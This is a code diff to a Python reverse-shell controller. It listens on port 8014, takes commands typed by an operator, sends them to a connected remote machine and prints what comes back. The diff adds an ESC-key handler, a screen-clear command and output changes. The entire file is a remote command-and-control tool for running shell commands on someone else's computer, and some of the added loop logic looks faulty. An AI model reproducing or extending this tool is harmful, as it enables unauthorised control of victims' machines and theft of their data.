@@ -1,5 +1,9 @@
 import socket
 import sys
+import keyboard
+from colorama import Fore
+import os
+
 
 SERVER_HOST = "0.0.0.0"
 SERVER_PORT = 8014
@@ -26,7 +30,20 @@ print(f"{client_address[0]}:{client_address[1]} Connected!")
 cwd = client_socket.recv(BUFFER_SIZE).decode()
 print("[+] Current working directory:", cwd)
 
+
+clear = lambda: os.system('cls')
+
+def checkkeypress():
+    # exit when ESC key press
+    if keyboard.read_key() == "esc":
+        cmd2 = "type esc"
+        client_socket.send(cmd2.encode())
+        pass
+
+
 while True:
+    
+    checkkeypress()
     # get the command from prompt
     command = input(f"{cwd} $> ")
     if not command.strip():
@@ -37,13 +54,16 @@ while True:
     if command.lower() == "exit":
         # if the command is exit, just break out of the loop
         break
+    if command.lower() == "cls":
+        clear()
     # retrieve command results
     output = client_socket.recv(BUFFER_SIZE).decode()
-    print("output:", output)
+    print(output)
     # split command output and current directory
     results, cwd = output.split(SEPARATOR)
     # print output
     print(results)
+    checkkeypress()
 # close connection to the client
 client_socket.close()
 # close server connection
